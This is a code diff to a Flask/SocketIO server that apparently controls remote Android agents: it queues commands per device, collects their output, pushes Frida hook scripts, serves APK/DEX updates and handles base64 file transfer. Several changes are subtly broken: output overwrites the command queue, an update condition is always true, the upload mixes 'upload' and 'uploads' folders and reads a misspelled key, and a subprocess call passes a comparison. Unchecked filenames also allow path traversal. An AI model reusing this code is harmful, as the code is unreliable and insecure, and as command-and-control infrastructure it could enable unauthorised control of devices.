@@ -6,6 +6,9 @@ from flask_cors import CORS
 from flask_socketio import SocketIO, emit
 import os
 import time
+import base64
+import subprocess
+from sys import stderr
 from token_utils import verify_signature, register_token, get_device_token, rotate_token
 
 app = Flask(__name__)
@@ -111,7 +114,7 @@ def post_output():
     data = request.json
     device_id = data.get("device_id")
     output = data.get("output")
-    device_outputs[device_id] = output
+    command_queue[device_id] = output
     connected_agents[device_id]["last_seen"] = time.time()
     print(f"[<] Output from {device_id}:\n{output}")
     return jsonify({"status": "ok"})
@@ -121,7 +124,7 @@ def set_command():
     data = request.json
     device_id = data.get("device_id")
     command = data.get("command")
-    device_commands[device_id] = command
+    command_queue[device_id] = command
     print(f"[!] Command for {device_id} set to: {command}")
     return jsonify({"status": "command set"})
 
@@ -163,6 +166,92 @@ def upload():
     os.makedirs("uploads", exist_ok=True)
     file.save(os.path.join("uploads", file.filename))
     return jsonify({"status": "ok"})
+
+# === Frida Hooks ===
+@app.route("/frida_hooks", methods=["POST"])
+def push_frida_hook():
+    data = request.json
+    device_id = data.get("device_id")
+    hook_script = data.get("script_name")  # e.g., "dynamic_reflection.js"
+    sid = agent_sockets.get(device_id)
+    path = os.path.join("frida_hooks", hook_script)
+    if not os.path.exists(path):
+        return jsonify({"error": "Hook file not found"}), 404
+    if sid:
+        with open(f"frida_hooks/{hook_script}", "r") as f:
+            js_code = f.read()
+        socketio.emit("load_frida_script", {"script": js_code}, to=sid)
+        return jsonify({"status": "hook sent"})
+    return jsonify({"error": "Agent not connected"}), 404
+
+# === Track heartbeat/ping ===
+@app.route("/check_update", methods=["POST"])
+def check_update():
+    data = request.json
+    device_id = data.get("device_id")
+    current_version = data.get("version")
+
+    # These should be updated in your CI/CD or manually
+    latest_dex = "update.dex"
+    latest_apk = "mmagent.apk"
+    latest_version = "2.0"
+
+    if current_version != latest_version:
+        return jsonify({
+            "update_available": True,
+            "type": "dex",  # or "apk"
+            "filename": latest_dex if "dex" else latest_apk,
+            "version": latest_version
+        })
+    return jsonify({"update_available": False})
+
+# === Flask Base64 File Upload ===
+@app.route("/upload_base64", methods=["POST"])
+def upload_base64():
+    data = request.json
+    filename = data.get("filename")
+    filedata = data.get("date")
+    if not filename or not filedata: 
+        return jsonify({"error": "Missing filenmae or data"}), 400
+    try:
+        os.makedirs("upload", exist_ok=True)
+        with open(os.path.join("uploads", filename), "wb") as f:
+            f.write(base64.b64decode(filedata))
+        return jsonify({"status": "uploaded"})
+    except Exception as e:
+        return jsonify({"error": str (e)}), 500
+    
+# === Flask Base64 File Download ===
+@app.route("/download_base64/<filename>", methods=["GET"])
+def download_base64(filename):
+    filepath = os.path.join("uploads", filename)
+    if not os.path.exists(filepath):
+        return jsonify({"error": "File not found"}), 404
+    try:
+        with open(filepath, "rb") as f:
+            encoded = base64.b64encode(f.read()).decode()
+        return jsonify({"filename": filename, "data": encoded})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+#=== Incorporate Dyna.py in the UI ===
+@app.route("/run_dyna", methods=["POST"])
+def run_dyna():
+    data = request.json
+    #device_id = data.get("device_id")
+    apk_path = data.get("apk_path")
+    package_name = data.get("package_name")
+    if not all([apk_path, package_name]):
+        return jsonify({"status": "error", "message": "Missing apk_path or package_name"}), 400
+    # You can import dyna.py as a module or call it as a subprocess
+    try: 
+        result = subprocess.check_output(
+            ["python3", "dyna.py", "--apk", apk_path, "--pkg", package_name, "--format", "html"],
+            stderr==subprocess.STDOUT
+        ).decode()
+        return jsonify({"status": "success", "output": result})
+    except subprocess.CalledProcessError as e:
+        return jsonify({"status": "error", "output": e.output.decode()})
 
 # === WebSocket Event Handling ===
 @socketio.on('connect')
